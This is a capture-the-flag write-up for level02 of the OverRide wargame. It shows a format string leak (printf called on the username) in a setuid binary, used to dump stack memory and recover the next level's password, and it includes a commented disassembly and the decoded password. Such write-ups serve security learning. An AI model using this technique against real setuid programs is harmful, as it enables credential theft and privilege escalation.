# LEVEL02
**Info: level protect option**
```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```
---
```sh
level02@OverRide:~$ ls -la
total 21
dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: 42
--[ Password: 42
*****************************************
42 does not have access!
```
We can find one excutable file **level02**, who take standard input with Username and Password. \
\
Check it with GDB,
```sh
level02@OverRide:~$ gdb ./level02 
(gdb) r
Starting program: /home/users/level02/level02 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
ERROR: failed to open password file
[Inferior 1 (process 2020) exited with code 01]
level02@OverRide:~$ file ./level02
./level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```
We can see the binary file is compiled in 64-bit. \
After analyzing given executable we could find format string vulnerability at ```line+654```
```sh
   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax # var username
   0x0000000000400a9a <+646>:   mov    %rax,%rdi
   0x0000000000400a9d <+649>:   mov    $0x0,%eax # absence of formatter
   0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt> # vuln printf(username)
   0x0000000000400aa7 <+659>:   mov    $0x400d3a,%edi # " does not have access!"
```
But what can we do with this? How can we obtain the shell or access the flag using this vulnerability? \
As we know there are 3 arrays in the main function, that stores: username, password, file_buffer. \
Username and the password strings are where our input will be contained and file_buffer is where our ```flag``` will be stored after ```read``` function.
```sh
   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt> # fread(file_buffer, 41, 1, file stream)
```
So the flag is saved in local variable before it checks our password input, which means somehow it's possible to capture the flag without knowing the password! \
Now back to our format string vulnerability, ```printf``` function is called after the flag is opened and saved in array ```file_buffer```. \
Since local variables sequence is: username, file_buffer, password - we can try to look at the stack by corrupting username input. \
For making this task easier we will create and use python script.
```sh
level02@OverRide:/tmp$ python /tmp/script.py 
level02@OverRide:/tmp$ cat /tmp/dump.txt 
0 | %0$lx does not have access!
1 | 7fffffffe4d0 does not have access!
2 | 0 does not have access!
...
21 | 0 does not have access!
22 | 756e505234376848 does not have access!
23 | 45414a3561733951 does not have access!
24 | 377a7143574e6758 does not have access!
25 | 354a35686e475873 does not have access!
26 | 48336750664b394d does not have access!
27 | feff00 does not have access!
28 | 786c24383225 does not have access!
...
```
Cool, we found some wierd stack datas from 22 to 26! \
Let's try to see what these datas are by using our python decoder.
```sh
python3 hex_endian_converter.py
From HEX to UTF-8
Encoded (hex) string: 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
756e505234376848  |  unPR47hH  |  Hh74RPnu
45414a3561733951  |  EAJ5as9Q  |  Q9sa5JAE
377a7143574e6758  |  7zqCWNgX  |  XgNWCqz7
354a35686e475873  |  5J5hnGXs  |  sXGnh5J5
48336750664b394d  |  H3gPfK9M  |  M9KfPg3H
result:  Hh74RPnu Q9sa5JAE XgNWCqz7 sXGnh5J5 M9KfPg3H
```
We have to make sure that decoder did reversed bytes (little-endian byte order) and changed the format to utf-8. \
Now it seems be like a password for the next level.

```sh
level02@OverRide:~$ su level03
Password: (hidden)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
```
level02 passed !

assmebly analayse
---

```sh
char str[96]
something 4bytes variable
char str2[??]
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400814 <+0>:     push   %rbp
   0x0000000000400815 <+1>:     mov    %rsp,%rbp
   0x0000000000400818 <+4>:     sub    $0x120,%rsp
   0x000000000040081f <+11>:    mov    %edi,-0x114(%rbp)
   0x0000000000400825 <+17>:    mov    %rsi,-0x120(%rbp)
   0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx # 112 - 16 = str[96] - var username
   0x0000000000400830 <+28>:    mov    $0x0,%eax
   0x0000000000400835 <+33>:    mov    $0xc,%ecx # 12 * 8 = 96
   0x000000000040083a <+38>:    mov    %rdx,%rdi
   0x000000000040083d <+41>:    rep stos %rax,%es:(%rdi) # memset(str, 0, 96)
   0x0000000000400840 <+44>:    mov    %rdi,%rdx
   0x0000000000400843 <+47>:    mov    %eax,(%rdx)
   0x0000000000400845 <+49>:    add    $0x4,%rdx # str[96] ~ 4bytes variable;
   0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx # 160 - 96 - 16 = str2[48] - var file_buffer
   0x0000000000400850 <+60>:    mov    $0x0,%eax
   0x0000000000400855 <+65>:    mov    $0x5,%ecx # 5 * 8 = 40
   0x000000000040085a <+70>:    mov    %rdx,%rdi
   0x000000000040085d <+73>:    rep stos %rax,%es:(%rdi) # memset(str2, 0, 40)
   0x0000000000400860 <+76>:    mov    %rdi,%rdx
   0x0000000000400863 <+79>:    mov    %al,(%rdx)
   0x0000000000400865 <+81>:    add    $0x1,%rdx
   0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx # 272 - 96 - 48 = str3[128]? - var password
   0x0000000000400870 <+92>:    mov    $0x0,%eax
   0x0000000000400875 <+97>:    mov    $0xc,%ecx # 12 * 8 = 96
   0x000000000040087a <+102>:   mov    %rdx,%rdi
   0x000000000040087d <+105>:   rep stos %rax,%es:(%rdi) # memset(str3, 0, 96);
   0x0000000000400880 <+108>:   mov    %rdi,%rdx
   0x0000000000400883 <+111>:   mov    %eax,(%rdx)
   0x0000000000400885 <+113>:   add    $0x4,%rdx
   0x0000000000400889 <+117>:   movq   $0x0,-0x8(%rbp)
   0x0000000000400891 <+125>:   movl   $0x0,-0xc(%rbp)
   0x0000000000400898 <+132>:   mov    $0x400bb0,%edx # "r"
   0x000000000040089d <+137>:   mov    $0x400bb2,%eax # "/home/users/level03/.pass"
   0x00000000004008a2 <+142>:   mov    %rdx,%rsi
   0x00000000004008a5 <+145>:   mov    %rax,%rdi
   0x00000000004008a8 <+148>:   callq  0x400700 <fopen@plt> # fopen("/home/users/level03/.pass, "r")
   0x00000000004008ad <+153>:   mov    %rax,-0x8(%rbp)
   0x00000000004008b1 <+157>:   cmpq   $0x0,-0x8(%rbp) # if(!file stream)
   0x00000000004008b6 <+162>:   jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>:   mov    0x200991(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x00000000004008bf <+171>:   mov    %rax,%rdx
   0x00000000004008c2 <+174>:   mov    $0x400bd0,%eax #  "ERROR: failed to open password file\n"
   0x00000000004008c7 <+179>:   mov    %rdx,%rcx
   0x00000000004008ca <+182>:   mov    $0x24,%edx # 36
   0x00000000004008cf <+187>:   mov    $0x1,%esi # 1
   0x00000000004008d4 <+192>:   mov    %rax,%rdi
   0x00000000004008d7 <+195>:   callq  0x400720 <fwrite@plt> # fwrite("ERROR: faile to open password file\n", 1, 36, stderr)
   0x00000000004008dc <+200>:   mov    $0x1,%edi
   0x00000000004008e1 <+205>:   callq  0x400710 <exit@plt> # exit(1)
   0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax # buffer[48]
   0x00000000004008ed <+217>:   mov    -0x8(%rbp),%rdx # fopen return value
   0x00000000004008f1 <+221>:   mov    %rdx,%rcx
   0x00000000004008f4 <+224>:   mov    $0x29,%edx # 41
   0x00000000004008f9 <+229>:   mov    $0x1,%esi
   0x00000000004008fe <+234>:   mov    %rax,%rdi #register convention  rdi rsi rdx rcx         r8 r9
   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt> # fread(file_buffer, 1, 41, file stream)
   0x0000000000400906 <+242>:   mov    %eax,-0xc(%rbp)
   0x0000000000400909 <+245>:   lea    -0xa0(%rbp),%rax
   0x0000000000400910 <+252>:   mov    $0x400bf5,%esi
   0x0000000000400915 <+257>:   mov    %rax,%rdi
   0x0000000000400918 <+260>:   callq  0x4006d0 <strcspn@plt> 
   0x000000000040091d <+265>:   movb   $0x0,-0xa0(%rbp,%rax,1)
   0x0000000000400925 <+273>:   cmpl   $0x29,-0xc(%rbp)
   0x0000000000400929 <+277>:   je     0x40097d <main+361>
   0x000000000040092b <+279>:   mov    0x20091e(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400932 <+286>:   mov    %rax,%rdx
   0x0000000000400935 <+289>:   mov    $0x400bf8,%eax # "ERROR: failed to read password file\n"
   0x000000000040093a <+294>:   mov    %rdx,%rcx
   0x000000000040093d <+297>:   mov    $0x24,%edx # 36
   0x0000000000400942 <+302>:   mov    $0x1,%esi
   0x0000000000400947 <+307>:   mov    %rax,%rdi
   0x000000000040094a <+310>:   callq  0x400720 <fwrite@plt> # fwrite("ERROR: failed to read password file\n", 1, 36, stderr)
   0x000000000040094f <+315>:   mov    0x2008fa(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400956 <+322>:   mov    %rax,%rdx
   0x0000000000400959 <+325>:   mov    $0x400bf8,%eax # "ERROR: failed to read password file\n"
   0x000000000040095e <+330>:   mov    %rdx,%rcx
   0x0000000000400961 <+333>:   mov    $0x24,%edx
   0x0000000000400966 <+338>:   mov    $0x1,%esi
   0x000000000040096b <+343>:   mov    %rax,%rdi
   0x000000000040096e <+346>:   callq  0x400720 <fwrite@plt> # ?? twice same fwrite() +310
   0x0000000000400973 <+351>:   mov    $0x1,%edi
   0x0000000000400978 <+356>:   callq  0x400710 <exit@plt>
   0x000000000040097d <+361>:   mov    -0x8(%rbp),%rax
   0x0000000000400981 <+365>:   mov    %rax,%rdi
   0x0000000000400984 <+368>:   callq  0x4006a0 <fclose@plt> # fclose(stream)
   0x0000000000400989 <+373>:   mov    $0x400c20,%edi #  "===== [ Secure Access System v1.0 ] ====="
   0x000000000040098e <+378>:   callq  0x400680 <puts@plt> 
   0x0000000000400993 <+383>:   mov    $0x400c50,%edi #  "/", '*' <repeats 39 times>, "\\"
   0x0000000000400998 <+388>:   callq  0x400680 <puts@plt>
   0x000000000040099d <+393>:   mov    $0x400c80,%edi #  "| You must login to access this system. |"
   0x00000000004009a2 <+398>:   callq  0x400680 <puts@plt>
   0x00000000004009a7 <+403>:   mov    $0x400cb0,%edi # "\\", '*' <repeats 38 times>, "/"
   0x00000000004009ac <+408>:   callq  0x400680 <puts@plt>
   0x00000000004009b1 <+413>:   mov    $0x400cd9,%eax #  "--[ Username: "
   0x00000000004009b6 <+418>:   mov    %rax,%rdi
   0x00000000004009b9 <+421>:   mov    $0x0,%eax
   0x00000000004009be <+426>:   callq  0x4006c0 <printf@plt>
   0x00000000004009c3 <+431>:   mov    0x20087e(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:   mov    %rax,%rdx
   0x00000000004009cd <+441>:   lea    -0x70(%rbp),%rax # username[96]
   0x00000000004009d1 <+445>:   mov    $0x64,%esi # 100
   0x00000000004009d6 <+450>:   mov    %rax,%rdi
   0x00000000004009d9 <+453>:   callq  0x4006f0 <fgets@plt> # fgets(username, 100, stdin)
   0x00000000004009de <+458>:   lea    -0x70(%rbp),%rax
   0x00000000004009e2 <+462>:   mov    $0x400bf5,%esi # "\n"
   0x00000000004009e7 <+467>:   mov    %rax,%rdi
   0x00000000004009ea <+470>:   callq  0x4006d0 <strcspn@plt> # strcpn(username, "\n")
   0x00000000004009ef <+475>:   movb   $0x0,-0x70(%rbp,%rax,1)
   0x00000000004009f4 <+480>:   mov    $0x400ce8,%eax # "--[ Password: "
   0x00000000004009f9 <+485>:   mov    %rax,%rdi
   0x00000000004009fc <+488>:   mov    $0x0,%eax
   0x0000000000400a01 <+493>:   callq  0x4006c0 <printf@plt>
   0x0000000000400a06 <+498>:   mov    0x20083b(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>:   mov    %rax,%rdx
   0x0000000000400a10 <+508>:   lea    -0x110(%rbp),%rax # password[128]
   0x0000000000400a17 <+515>:   mov    $0x64,%esi
   0x0000000000400a1c <+520>:   mov    %rax,%rdi
   0x0000000000400a1f <+523>:   callq  0x4006f0 <fgets@plt> #fegts(password, 100, stdin)
   0x0000000000400a24 <+528>:   lea    -0x110(%rbp),%rax # var password
   0x0000000000400a2b <+535>:   mov    $0x400bf5,%esi # \n
   0x0000000000400a30 <+540>:   mov    %rax,%rdi
   0x0000000000400a33 <+543>:   callq  0x4006d0 <strcspn@plt> # strcspn(var password, \n) # finds \n in password string
   0x0000000000400a38 <+548>:   movb   $0x0,-0x110(%rbp,%rax,1)
   0x0000000000400a40 <+556>:   mov    $0x400cf8,%edi # '*' <repeats 41 times>
   0x0000000000400a45 <+561>:   callq  0x400680 <puts@plt>
   0x0000000000400a4a <+566>:   lea    -0x110(%rbp),%rcx # var password
   0x0000000000400a51 <+573>:   lea    -0xa0(%rbp),%rax # var file_buffer
   0x0000000000400a58 <+580>:   mov    $0x29,%edx
   0x0000000000400a5d <+585>:   mov    %rcx,%rsi
   0x0000000000400a60 <+588>:   mov    %rax,%rdi
   0x0000000000400a63 <+591>:   callq  0x400670 <strncmp@plt> # strncmp(file_buffer, password, 41)
   0x0000000000400a68 <+596>:   test   %eax,%eax # strncmp != 0
   0x0000000000400a6a <+598>:   jne    0x400a96 <main+642>
   0x0000000000400a6c <+600>:   mov    $0x400d22,%eax # "Greetings, %s!\n"
   0x0000000000400a71 <+605>:   lea    -0x70(%rbp),%rdx # var username
   0x0000000000400a75 <+609>:   mov    %rdx,%rsi
   0x0000000000400a78 <+612>:   mov    %rax,%rdi
   0x0000000000400a7b <+615>:   mov    $0x0,%eax
   0x0000000000400a80 <+620>:   callq  0x4006c0 <printf@plt> # printf("Greetings, %s!\n", username)
   0x0000000000400a85 <+625>:   mov    $0x400d32,%edi #  "/bin/sh"
   0x0000000000400a8a <+630>:   callq  0x4006b0 <system@plt> # system("/bin/sh")
   0x0000000000400a8f <+635>:   mov    $0x0,%eax
   0x0000000000400a94 <+640>:   leaveq 
   0x0000000000400a95 <+641>:   retq            # the last line of function return (0)
   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax # var username
   0x0000000000400a9a <+646>:   mov    %rax,%rdi
   0x0000000000400a9d <+649>:   mov    $0x0,%eax # absence of formatter
   0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt> # vuln printf(username)
   0x0000000000400aa7 <+659>:   mov    $0x400d3a,%edi # " does not have access!"
   0x0000000000400aac <+664>:   callq  0x400680 <puts@plt>
   0x0000000000400ab1 <+669>:   mov    $0x1,%edi
   0x0000000000400ab6 <+674>:   callq  0x400710 <exit@plt> # exit(1)
End of assembler dump.
```
